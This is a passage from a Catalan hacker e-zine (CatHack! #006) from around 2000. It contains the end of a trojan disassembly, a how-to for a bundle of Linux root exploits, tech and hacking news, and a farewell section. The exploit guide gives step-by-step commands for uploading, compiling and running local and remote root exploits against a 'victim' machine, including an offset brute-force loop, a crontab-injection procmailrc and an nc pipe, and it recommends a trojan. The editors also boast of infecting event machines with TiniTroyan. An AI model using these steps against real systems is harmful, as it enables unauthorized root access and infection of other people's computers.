:0040132C 00000000000000000000    BYTE 10 DUP(0)
:00401336 00000000000000000000    BYTE 10 DUP(0)
:00401340 00000000000000000000    BYTE 10 DUP(0)
:0040134A 00000000000000000000    BYTE 10 DUP(0)
:00401354 00000000000000000000    BYTE 10 DUP(0)
:0040135E 00000000000000000000    BYTE 10 DUP(0)
:00401368 00000000000000000000    BYTE 10 DUP(0)
:00401372 00000000000000000000    BYTE 10 DUP(0)
:0040137C 00000000000000000000    BYTE 10 DUP(0)
:00401386 00000000000000000000    BYTE 10 DUP(0)
:00401390 00000000000000000000    BYTE 10 DUP(0)
:0040139A 00000000000000000000    BYTE 10 DUP(0)
:004013A4 00000000000000000000    BYTE 10 DUP(0)
:004013AE 00000000000000000000    BYTE 10 DUP(0)
:004013B8 00000000000000000000    BYTE 10 DUP(0)
:004013C2 00000000000000000000    BYTE 10 DUP(0)
:004013CC 00000000000000000000    BYTE 10 DUP(0)
:004013D6 00000000000000000000    BYTE 10 DUP(0)
:004013E0 00000000000000000000    BYTE 10 DUP(0)
:004013EA 00000000000000000000    BYTE 10 DUP(0)
:004013F4 00000000000000000000    BYTE 10 DUP(0)
:004013FE 0000CA200000DC200000    BYTE 10 DUP(0)
--[3]----[ TINI.DASM ]-------[ tini.exe desensamblat amb el Dasm ]------------

--[4]----[ REDHAT6.2 - XPLOITS ]----------------------------------------------
                                  Codi Font
                                  =========

                          Codi d'exploits per Linux


Amb aquest fitxer s'adjunten, comprimits, el codi font de varis exploits per
aconseguir root a una de les ultimes distribucions de Linux, la RedHat 6.2,
encara que tambe permet fer root a moltes altres distribucions. Es un recull
de tots els exploits fets publics fins el moment en diverses llistes de
distribucio sobre vulnerabilitats.

Els pegats per les vulnerabilitats que aprofiten els exploits els trobareu a
http://www.redhat.com/support/errata/rh62-errata-security.html, a
ftp://updates.redhat.com o a qualsevol dels seus mirrors. Si teniu alguna
altra distribucio de Linux, busqueu a la seva pagina web.

No es la intencio de qui escriu aquestes linies que us convertiu en 'script
kiddies', si no ajudar a que les persones que s'inicien puguin practicar i
jugar una mica, aixi com proporcionar exploits per poder estudiar el seu codi.

Molts dels exploits son locals. Aixo vol dir que per utilitzar-los ja haureu
de ser usuaris de la maquina. Per enviar un exploit a l'ordinador victima
haureu d'escriure:

      ftp adreca-victima
      username: nom_usuari
      password: contrasenya
      put nom_exploit.c

Per compilar els exploits des de Linux basta amb escriure:

      gcc nom_exploit.c -o nom_exploit

I per executar-los cal escriure:

      chmod +x nom_exploit
      ./nom_exploit

Alguns dels exploits son remots. Aixo vol dir que per utilitzar-los contra una
maquina no cal que sigueu usuaris d'ella. Els haureu de compilar al vostre
ordinador i a la linia de parametres de l'exploit posareu, entre d'altres,
l'adreca IP de la maquina victima. Si voleu provar-los contra el vostre propi
ordinador, llavors com a adreca IP a la linia de parametres de l'exploit
haureu de fer servir la 127.0.0.1, que es una referencia al propi ordinador.

Com podreu comprovar, alguns exploits funcionen i altres no. Ara passarem a
comentar-los tots una mica.

a) gdmx.c es un exploit remot que permet fer root. No m'ha funcionat.

   1) L'heu de compilar en el vostre ordinador.

   2) Executeu-lo afegint l'IP de la maquina a atacar i un nombre entre 0 i
      300. Per exemple: gdmx 147.83.170.108 0

   3) Feu telnet al port 3879. Si podeu sou root, si no proveu amb un altre
      nombre entre 0 i 300. Per provar-los tots:

      for i in $(seq 300) do
        echo $i
        gdmx 147.83.170.108 $i
        telnet 147.83.170.108 3879
      done

b) sendmailx.sh, prlnx.sh i smlnx.sh son exploits locals que empren sendmail
   per fer root, aprofitant la vulnerabilitat del 'capability setuid' que
   afecta als kernels 2.2.x on x < 15. Per una informacio mes detallada sobre
   aquesta vulnerabilitat llegiu el fitxer adjunt cap_setuidx.txt.

   1) Envieu mitjancant ftp qualsevol dels tres fitxers a la maquina victima.

   2) Entreu mitjançant telnet al vostre compte de la maquina victima.

   3) Executeu i ja teniu privilegis de root.

   ex.c i add.c tambe son exploits locals que empren sendmail per fer root,
   aprofitant la vulnerabilitat del 'capability setuid'.

   1) Compileu els fitxers ex.c i add.c a l'ordinador victima.

   2) Creeu un fitxer "mail" que contingui:

      From: algu@foobar.com
      To: localuser@localdomain.com
      Subject: foo
      bar
      .

   3) Crear un fitxer .forward que contingui:
    
      |/cami/a/afegir

   4) Executar: ./ex < mail
      Aixo hauria de crear un usuari algu amb uid/gid = 0 i sense contrasenya.

   5) Executar: su - algu per aconseguir root.

   Si volem explotar el bug sobre RedHat 6.1, en aquest sistema sendmail esta
   configurat per utilitzar smrsh, que no reenvia mitjancant .forward els
   missatges a alguns programes. Aquest sistema encara es vulnerable, ja que
   sendmail esta configurat per executar procmail. Nomes heu de crear un
   fitxer .procmailrc enlloc de .forward. Per exemple:

   LOGFILE=/etc/crontab
   LOG="* * * * * root /tmp/el_meu_script.sh"
   LOGABSTRACT=no
   :0
   /dev/null   

c) bindx.c es un exploit remot pel bind 8.2 - 8.2.2, que permet obtenir un
   shell remot amb privilegis de root. Per mes informacio llegiu el fitxer
   adjunt bindx.txt. Per coneixer quina versio de bind te l'ordinador victima,
   tambe adjunto el programa bindinfo.c.

d) inndx.c es un exploit remot que permet fer root pel innd-2.2.2-3, servidor
   de noticies que s'instal.la per defecte al RedHat 6.2.

   1) Compileu-lo: gcc inndx.c -o inndx

   2) Executeu-lo: ./inndx [command [offset]] | nc -i 1 adreca.victima 119
   
e) splitvtx.c es un exploit local que permet fer root pel splitvt 1.6.3-4,
   programa que s'instal.la per defecte al Debian.

   1) Envieu-lo a l'ordinador victima i compileu-lo.

   2) Per deixar el codi de l'exploit al fitxer 'expcodi' executeu:
      ./splitvtx > expcode
 
   3) Inicieu splitvt

   4) Escriviu quelcom com 'sleep 60; echo lalala', 

   5) Ctrl+O, x, 'Enter password' bla

   6) Quan splitvt diu 'Re-enter password' es el moment de seguir les 
      instruccions a 'expcodi' per enganxar el codi de l'exploit a splitvt.

   7) No premeu enter. Espereu fins que finalitzi 'sleep' o mateu el proces 
      'sleep' des d'un altre terminal.

   8) Ja esta. Escriviu 'reset' per aconseguir un terminal normal.

f) dumpx.c es un exploit local que permet fer root pel dump, programa que
   s'instal.la per defecte al RedHat 6.2 i moltes altres distribucions de
   Linux. Si el kernel Linux es 2.2.x on x < 16 s'obte root, en cas contrari
   s'obte setgid root.

   1) Envieu-lo a l'ordinador victima i compileu-lo.

   2) Executeu-lo, segons la versio de dump que tingueu, escrivint:
      dumpx dump-0.3-14 [offset]     o be     dumpx dump-0.4b13 [offset]

g) wuftdx.c es un exploit remot que permet fer root pel wuftpd 2.6.0(1),
   servidor de ftp que s'instal.la per defecte al RedHat 6.2 i moltes altres
   distribucions de Linux i Unix. Aprofitant dues vulnerabilitats en la
   validacio d'entrada ("site exec" and setproctitle()), usuaris locals i
   remots de ftp, incloent l'usuari 'anonymous', poden executar codi com root.

   1) L'heu de compilar en el vostre ordinador.

   2) Executeu-lo escrivint, per exemple: ./wuftpdx adreca_victima

   Aquest exploit l'he provat i m'ha funcionat a la perfeccio.
   Es un exploit remot curios. El servei pare (inetd) no queda afectat i, per
   tant, no hi ha indicacio externa d'haver estat atacat. Tampoc es un buffer
   overflow i, per tant, cap proces finalitza de manera inesperada.

h) statdx.c es un exploit remot que permet fer root pel servidor RPC
   rpc.statd. L'exploit esta preparat per ordinadors victima amb RedHat 6.x
   pero es pot adaptar a moltes altres distribucions de Linux.

   1) L'heu de compilar en el vostre ordinador.

   2) Executeu-lo escrivint, per exemple: ./statdx [port] adreca_victima

   Si observeu el codi font de l'exploit, veureu que fins i tot el codi
   maquina esta comentat i apareixen les corresponents instruccions en
   ensamblador, el que permet fer un seguiment acurat del codi i apendre
   bastant. Un exemple a seguir.

i) slrnpullx.c es un exploit local que no tinc ni idea d'on ha sortit.

j) glibcx1.c i glibcx2.c son dos exploits locals que aprofiten una
   vulnerabilitat trobada a glibc 2.1. Cal modificar tots dos per que
   funcionin. Probeu de trobar un valor especial amb gdb. glibcx1.c esta
   provat a RedHat 6.2 amb el kernel 2.2.16 i glibcx2.c esta provat a Debian
   2.x.

<NOTE>
 Hem de ser sincers, el més segur es que no us funcioni o com a molt algun
 dels exploits que us oferim, la raó és que la majoria (els més importants)
 tenen el codi modificat expresament (no per nosaltres, sino pels creadors)
 pq no funcionin sino k simplement mostrin més o menys com funciona el
 fallo k han trobat i k els script-kiddies no s'aprofitin i es dediquin a
 petar màquines sense saber el k estan fent, sino pq aprenguin a programar
 i a fer ells els seus propis programes.
 No som nosaltres els ki us ho donem "malament", sino els creadors dels
 exploits, es per aixo k no volem rebre cap mail dient "no em funciona..."
 pq ja esteu avisats, a més, moltes versions s'actualitzen ràpidament i
 deixen de ser petables.
 Per cert, tots els programes aqui comentats estan ficats a la secció de
 fitxers adjunts sota un fitxer .uue (uuencoded) el podeu obrir amb el
 winzip o amb el uudecode (per linux o ms2).

pd: si voleu pillar root en una maquina unix podeu utilitzar un troyano
 anomenat bindwarez, k vé amb el texte "HackBible" (la biblia del hacking).
</NOTE>



--[4]----[ REDHAT6.2 - XPLOITS ]----------------------------------------------


                                          El pasat, és pasat, però ja ha pasat
                                                                 -Banda Jachis

((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((
))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))
((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((
))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))


$11$


NNN   NNN  NNNNNN  NNNNNNN NNN  NNNNN NNN NNNNNN  NNNNN
NNNNN NNN NNN  NNN NNNNNNN NNN NNN    NNN NNN__   NN__
NNN NNNNN NNN  NNN   NNN   NNN NNN    NNN NNN        NN     per BaRner
NNN   NNN  NNNNNN    NNN   NNN  NNNNN NNN NNNNNN NNNNNN


- Apareix un cuc anomenat LifeStages que es reprodueix per mail, no té cap
  payload destructiu pero el seu alt nivell de reproducció fa que pugui
  arribar a penjar els servidors de mail. Es presenta com un "aparent fitxer
  de texte" adjunt. L'FBI està començant a investigar. És VBS.

- Apareix, accidentalment? el virus "Anti-Smyser 1", un virus creat per l'otan
  per forçar a Kosovo a resoldre el conflicte...pero resulta que l'han cagat i
  sel's ha escapat...ui quines coses paseeeen...bé, el cas és k es reprodueix
  per mail i el 13 de Desembre de cada any esborra tots els fitxers d'un disc
  dur a l'atzar. Vé com a fitxer adjunt (es la moda) sota el seu nom.

* Assalten el Ministeri de Tecnologia 

    Ministeri de Ciencia i Tecnologia 0 - Hackers 1. Els 
    pirates informàtics s'apunten un punt en el seu 
    marcador en "modificar" la Web del citat Ministeri la nit 
    del dissbte. 

    Mireia Cortés ( Mireia@noticias.com ) - El site del Ministeri 
    de Ciència i Tencologia va ser assaltat per hackers la nit del 
    dissabte al diumenge, segons han confirmat fonts del 
    ministeri. 

    Els hackers van aconseguir deixar en blanc la pàgina central 
    del organisme oficial, en la que van insertar aquesta 
    inscripció en anglès “ozzman wuz here... admin go SUCK 
    BALLS!”, el que va causar l’alarma entre alguns dels usuaris 
    de la Xarxa que van consultar el site. 

    Els serveis tècnics del ministeri que dirigeix Anna Birulés, 
    que havien revisat la pàgina per última vegada a les 21’30 
    hores el dissabte, van detectar l’acte de pirateria sobre les 
    vuit del matí del diumenge i van restablir la pàgina original 
    hora i mitja després. 

    El pirata va utilitzar múltiples ordinadors per “modificar la 
    Web” de Ciència i Tecnologia i va deixar la seva frase, 
    segons van assenyalar fonts del departament, la identitat 
    del subjecte, fins al moment no ha estat possible de 
    conèixer. 

    Un portaveu oficial va subratllar que “no ha passat res 
    important. El ministeri esta homologat, compleix tots els 
    requisits de seguretat, té tots els “tallafocs” necessaris, no 
    han pogut entrar més enllà de la pàgina principal. Aquestes 
    coses són una mica inevitables”. 
  

 * Un nou dispositiu de l'empresa UbiNetics permetrà realitzar 
    trucades a movils des PalmV 
  

* America Online es invadit per pirates informàtics:
    Pirates informàtics van invadir les contes dels treballadors
    d'AOL amb la intenció d'ingressar en les contes personals
    dels seus clients.

* S'ha acabat de desxifrar i ordenar tot el genoma humà (total = 3000MB),
  pero es veu que no tot és bó, o sigui, que la majoria del "codig font humà"
  són NOPs, i per tant, brosa, i ordres inútils, ara els falta desxifrar la
  resta, o sigui les convinacions no-NOPs, les interrupcions, les entrades/
  ortides i moviments de gens...pero la pregunta és...haviat podrem obtindre
  els codigs fonts del virus? - aixo m'interessa! ;)

* Microsoft es passarà al ".net", en que convertirà tots els seus programes
  (office, word...) a XML accesible desde web amb una conta que cal pagar per
  tenir-la...per evitar copies ilegals...començarà una nova era de DoS xD.

* Okupats els dominis www.leoblair.com i www.babyleo.co.uk el dia en que va
  néixer el fill monàrquic...que es foti!

* Ha sortit un teclat flexible (es pot enrrotllar) i hermetic (es pot
  submergir), per un preu de 12.000 petes - que practic!!! xD

* Al 2001-2 sortiràn les primeres PDAs amb wap.

* S'ha estrenat el cinema digital (3 entrades de video digital (rebut per
  satel·lit codificat), que a través d'uns prismes i una llum blanca
  reflexa una imatge molt nítida.

* Noticia... Han akonseguit crackejar la Dream Cast, no pots fer copia dels
  Giga-ROM's pero si ke pots baixarte els jocs (eh lobo?) i gravarlos d'una
  manera xunga pq funcionin en un cd de 80 mins.
  www.dcisos.com
  www.dchack2000.com

  Pq vagin les copies de DreamCast s'ha de posar un Boot CD ke es una merda
  programet ke okupa kasi res. El fots a la DC, l'engegues i et diu: posa el
  CD i li fots la copia i a jugar!!!!! : )

* La primera tarifa plana real 

  Un altra vegada Retevisión sacseja al mercat oferint la 
  primera tarifa plana real d’Espanya. El servei estarà 
  disponible a partir del 1 de juliol i la quota serà de 9.900 
  pessetes per disposar de connexió a Internet les 24 hores 
  al dia. 
  
* Apareix la versió Immunix 6.2 (un clon del rh6.2 pero amb
  millores de seguretat).
  http://wirex.com/                -              http://immunix.org/

* Intel prepara el p4 (pentium 4) i el IA64 (Itanium64bits). Pot ser
  interessant, com a minim els viciats de l'ASM tenen en la pàgina
  http://linuxassembly.org on aviat presentaran una secció dedicada als
  64bits.

 Ja podem llençar "ous online als polítics 
  per fer-ho aneu aki www.ovoneles.com.br 
  

* Sony esta desenvolupant un CD-ROM/-R/-RW  de doble densitat ke tindrà capacitat 
 de 1.3GB 

 Manual molt complet de pgp    http://www.kriptopolis.com/pgp 
  

* Terra i retevision ofereixen tarifa plana per 
2600 (rete.) i 2750 (terra)  de les 18:00 a les 8h 
 i els caps de setmana tot el dia!! 

* Kevin Mitnick tornarà a tocar un ordinador...per escriure un article i punt,
  pero el tornarà a tocar ;)

* El grup 2600 s'està ficant amb problemes per culpa dels DVD...coi
  d'empresaris!

* ONO construiïrà una xarxa per tota la peninsula i mallorca de fibra òptica.

* Microsoft presenta la seva nova versió del seu "SO" Windows pels sistemes
  de intel Itanium de 64bits.

El Pentium 4 ja és aquí 

    Intel llença al mercat el nou processador Pentium 4 
    amb novetats significatives 

    Raquel Martín (raquel@noticias.com) - En una presentació 
    en el transcurs del Fòrum Intel sobre Desenvolupaments, la 
    companyia nord-americana Intel ha anunciat que llençarà 
    l’últim trimestre d’aquest any 2000 el seu nou 
    microprocessador Pentium 4. Aquesta nova versió del 
    Pentium presenta algunes novetats importants: amb una 
    velocitat d’1,4 Ghz, ressol amb més rapidesa els problemes 
    de la compressió de vídeo, té 42 milions de transistors 
    instal&middot;lats i 144 ordres programades per a ús multimèdia. La 
    versió per a ordinadors personals estarà disponible l’últim 
    trimestre d’aquest any i l’adreçada a ordinadors portàtils ho 
    estarà l’any que ve.El Pentium 4 està principalment adreçat 
    als internautes interessats en els jocs informàtics i als 
    homes de negocis. 

    A banda de l’anunci d’aquest llençament, la companyia Intel 
    també ha presentat uns altres productes de la marca, com 
    són els processadors Strongarm per a telèfons cel&middot;lulars i 
    altres aparells de telefonia mòbil i el processador Xeon. 
    Aquest últim producte, que va a una velocitat d’1 Ghz, està 
    dissenyat per a oferir-se a servidors d’Internet i laboratoris 
    científics. A més, Intel donarà més dades sobre el 
    processador Itanium, que consisteix a un xip de 64 bits. 

Un hacker ataca webs pederastas 
   Les pàgines eren:
    lo-li-ta.com
    16-plus.com
    euro-lolitas.com
   el hacker va canviar la pàgina per un missatge en protesta
   contra els pederastes. El hacker va dir k tenia totes les
   dades dels usuaris d'aquelles pàgines (targetes de crèdit,
   DNI, etc, i va decidir no publicar-les esperant que el tema
   de la pederastia s'acabés.

El punk alemany Falko Lüdker ha mort assassinat per un bonehead.
   Prou violència feixista!

                                           Defensa la terra i ataca a l'estat.
                                                                     -PUA

//////////////////////////////////////////////////////////////////////////////
\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
//////////////////////////////////////////////////////////////////////////////
\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

$12$

  &&&&&&&&&&&&&&&&&&&&
 &&                &&
&&  Acomiadament  &&oooooooooooooooooooooooooooooooooooooooooooooooooooooooooo
&
&
& Esperem que us hagi agradat aquesta nova edició de la ezine, esperem (per
& variar una mica :P) col·laboracions de tothom, tant textes, dubtes, idees,
& noticies, articles, programes, codigs fonts (cf), exploits, etc. Els podeu
& enviar a la conta poptph@hotmail.com intentarem respondre el més aviat
& possible.
&
& Poc a poc anem fent la ezine, però requerim de l'ajuda de tots vosaltres per
& seguir el projecte. Si esteu d'acord amb les nostres idees podeu col·laborar
& amb nosaltres, intentarem ficar-vos els vostres articles, però recordeu que
& hauran d'estar alienats a 78 columnes i escrits en ANSI (més que res per les
& compatibilitats entre sistemes (win/lin).
&

Per cert, hem estat mirant estadistiques sobre visites de web i nom‚s caldr…
que mireu aquestes xifres extretes de vanhackez:
  CatHack!:  113
  SET:       340
Increible! tenim la tercera part de les visites que la legendaria SET! el
cert es k estem orgullosos q tot el tema akest ruli b‚, ja que fa gracia
veure com un projecte comen‡at per quatre matats (BPAP) ;) - acabi essent
una cosa important...sniff...estem emocionats xD - De deb¢ moltes gr…cies
per interessar-vos amb nosaltres i per cert, us recordem un cop m‚s que
podeu colúlaborar amb la ezine enviant els vostres articles escrits en
catal… a la direcci¢ de sempre: poptph@hotmail.com - animeu-vos! pq segur
que els possem :) - El cert es k no calen gaires filtres, agafem tot el
k ens donen xD...pero b‚, est… clar q el texte ha d'encaixar amb la
revista, ha d'estar ideat per vosaltres (res de copies), qualsevol cosa
val hack, phreak, virii, programaci¢, electronica, cracking, humor, opinions.

L'important es aportar idees, k potser una petita idea no val, pero junt
amb una altre i una altre es poden conseguir coses importants, aixi q
animeu-vos, a programar! a escanejar! a desensamblar! a compilar!

                           A HACKEJAR!

Que per cert, pensem obrir properament un apartat nou on poder parlar de
temes socials (okupacions, manifestacions, lluites, situaci¢ del hack,
guerres a l'irc, el k sigui), esteu tots convidats a enviar els vostres
textes d'opini¢.

Aquest any ja van 3 punts importants de trobada, anem a veurel's.

Campus Party: Nom‚s va poder anar-hi el Brainstorm, pq no hi havien
  suficientes places. :( jo...es va situar en la zona de linuxerus.
  com no? :) i b‚, esperem k haviat poguem gaudir del seu BrainRouter
  486-33 sota BrainLinux ;) en versi¢ redu‹da de 8 megues. Felicitats!
  I potser podrem gaudir d'alguna distribuci¢ nova del Linux ben
  estructurada q ocupara uns 50 megues, amb Gnome, Kde, X i dem‚s
  xominades.

ExpoInternet: Aquest any ha estat una mica trista la kdd, nom‚s erem
  3, (pop, kuduk, brain)- El cert, es k va ser m‚s gresca k cap altre
  cosa, ...no haurien de donar cervesa gratis en cap stand xDDDD -
  per m‚s k demanin carnet xD- altres problemes es k ens fotien fora
  dels stands, les grenyes, la roba...que els donguin! per ser com som
  ens han de vigilar m‚s? - Vam cargar la p…gina en pantalles grans
  per fer propaganda ilegal xD - Ens van donar un cond¢ (venia amb la
  birra), el condo no era shell xD - Vam infectar algunes maquines amb
  el TiniTroyan, i vam probar una conexi¢ a 115KB/s (impressionant!),
  pero poca cosa m‚s, conexi¢ gratis i per cert, akest any hi havia
  menys vigilancia a la MENTA, es podia estar tota l'estona sense k
  et fotessin fora ni res...ara suposo k si fots Kortatu a tot drap
  et diran algo...eh kuduk! xD.

HackMeeting: Encara no ha arribat, es a finals d'octubre al Centre
  Social Okupat de les Naus (a la vila de Gr…cia (bzn)) - Pel k sembla
  esta for‡a organitzat, pero calen ordinadors, hi haura musica
  (tecno guai), conferencies sobre tem…tiques varies:


Debate sobre Enfopol i derivats. Arturo Quirantes

Debat  sobre  mitjans  de  contrainformació. Arroba, A-Infos, Usurpa,
Borinot...  Coordinan  Ibai  y  Manu. + Debat sobre mitjans de mases i
hackers. Coordina Jose Luis de Vicente.

Debat sobre xarxes ciutadanes. Coordina Sergi Bueno.

Debat sobre criptografia i politica. Coordina David Casacuberta

Debat sobre ciberdrets. Coordina David Casacuberta.

Debat sobre filosofia hacker. Coordina Merce Molist

Debat  sobre  hacktivisme,  Internet  en  la lluita social i politica.
Coordina Roxu i David Casacuberta.

Algo sobre la lluita telefònica, xerrada o debat. Asociacion de Internautas.


Xerrades:

Freenet, Napster, Gnutella... Javier Villate

Genealogia  d' Internet i la seva relació amb els movimients socials.
Deal

Maquinas inteligentes. Outlimit

Net-art  +  censura,  privacitat,  comercializació...  Jose  Luis  de
Vicente.

Legalitat del hacktivisme. Carlos Sanchez Almeida.

Algo sobre dominis. Javier Maestre

Patents i soft lliure. Javier Candeira

Maria i altres formes de hackejar la teva ment
  . Coordina David Casacuberta


  Es inevitable no comentar els problemes amb HispaHack!, ... trist, aquesta
  gent k se sent tant hispana i prepotent sobre la dem‚s gent tractant de
  lammers a tothom quan ells son els primers demostrant una ment tant
  tancada (i gens inquieta), k son incapa‡os d'apropar-se a una casa okupa
  pq ("los okupas le roban"), no ho entenem...potser no son tots els membres
  del grup, potser algun es salva pero des k vam comen‡ar hem sentit
  bronques de grups amb ells i dem‚s hist•ries, ara ens ha tocat a nosaltres
  les bronques amb ells, ens tanquen la web, ens foten fora de l'irc (clar
  coneixent als FATXES dels irCOPS qualsevol pot conseguir OP en qualsevol
  canal eh cabroncetes!) bannejant i privant-nos el nostre dret a parlar
  de forma lliure sense fills de puta pel mig. B‚ deixem el tema...pq no
  acabarem mai.

  us deixem amb un dels mails k van enviar a la llista del hackmeeting:

""
Sintiéndolo mucho tenemos que comunicar que !Hispahack se desvincula
totalmente del hmbcn, no comulgamos con el enfoque que se le esta
dando. Un movimiento tecnológico como este no se puede mezclar a la
ligera con politiqueo, ocupas y el afán de protagonismo de algunos
que no entienden que es ser hacker. Para inspirarse en una
conferencia, uno se inspira en las de prestigio como las del CCC, las
DEFCON y no en las italianas, para acabar en una casa okupa, llena de
gente, con secreta, en la que brillaran por su ausencia los hackers.
Como en todo hay clases, y sinceramente lamentamos que esta
conferencia tome por definición de hacker la del chico de 15-25 años
que se sienta en un ordenador ejecutando programas para conseguir
acceso en un sistema o que monta un e-zine de la noche a la mañana.
Por ese motivo y dado que esta conferencia esta dirigida hacia este
tipo de gente, vemos nuestra participación fuera de lugar.

Les deseamos lo mejor.

!Hispahack
http://hispahack.ccc.de
""

  en emails posteriors comentaven altres temes passant-se encara més
  de voltes, i hem decidit no possar-los per no crear encara més
  conflictes, no volem bronques ni mals rollos amb ningu i molt menys
  amb gent tant superior com ells han demostrat ser. (to ironic). Pq
  ser hacker vol dir voler aprendre. - Pero bé deixem-ho.

  Doncs per on anavem, al HackMeeting hi anirem...el barner, el pop i
  l'acastan m‚s d'un dia ens podreu veure per all…, la resta segur k tb,
  estara for‡a b‚, un bon lloc per compartir coneixements sense trabes,
  amb cares noves (hi anira bastanta gent), bon ambient, barra...mmmh
  priva! ) i dem‚s hist•ries.

  Des de CatHack! donem tot el suport a la realitzaci¢ del hm2k (hackmeeting
  2000), Salut Merce!! :P

Tb hem de parlar sobre els dos presos antifeixistes detinguts al 98, k fa
poc estan en tràmits per entrar a la presó...podeu anar a firmar (en
principi al casal de la PUA (c/verdi a dalt de tot :) ) a firmar pq no els
engarjolin, CAP ANTIFEIXISTA A LA PRESó!

Esperem rebre m‚s colúlaboracions proximament, no tant sols per l'elevat
nombre de visitants k estem tenint ultimament sino pq la gent es va
interessant m‚s pels temes de seguretat inform…tica...per cert, un missatge
pels principiants: NO US TALLEU PER PREGUNTAR, AQUI NINGU US TRACTARA
D'IGNORANTS NI LAMMERS, EL CONEIXEMENT ES LLIBERTAT (el poder es feixisme)
aixi k no us talleu en preguntar coses de l'estil: "k son els ports?",
"com canvio les taules d'enrutament?", "com s'instal.la el Linux?", tots hem
passat per akestes facetes i cal donar suport pq pogueu arribar a tindre
suficient coneixement sobre tot.

Vinga animeu-vos! el cam¡ es llarg i complicat, pero no estem sols!

Salut i Lluita!


                _________________________________________
               |  &&&&&&&&&&&  &&&&&&&&&&&     &&&&      |
               |  &&&&&&&&&&&  &&&&&&&&&&&  &&&&&&&&&&&  |
               |  &&&&&               &&&&  &&&&&&&&&&&  |
               |  &&&&&        &&&&&&&&&&&     &&&&      |
               |  &&&&&&&&&&&  &&&&   &&&&     &&&&      |
               |  &&&&&&&&&&&  &&&&&&&&&&&      &&&&&    |
               |&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&|
               |&&   &&   &&      &&&       &   &&&  &&&&|
               |&&   &&   &&&&&&   &   &&&&&&   &&  &&&&&|
               |&&        &&       &   &&&&&&      &&&&&&|
               |&&   &&   &&  &&   &   &&&&&&   &&  &&&&&|
               |&&   &&   &&       &&       &   &&&  &&&&|
               |&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&|


                          AJUDA A LA POLICIA:
                           PEGA'T TU MATEIX.
                                 -PUA-

.----------------------------------------------------------------------------.
| CatHack!#006  .------------------------------------------------------------|
|--------------'                                                             |
|   CatHack!  es  pot  distribuïr  lliurement  sense  impossar  cap  taxa,   |
|   sempre  i  quan  no   es  modifiqui  el   contigut  de   la   revista.   |
`----------------------------------------------------------------------------'
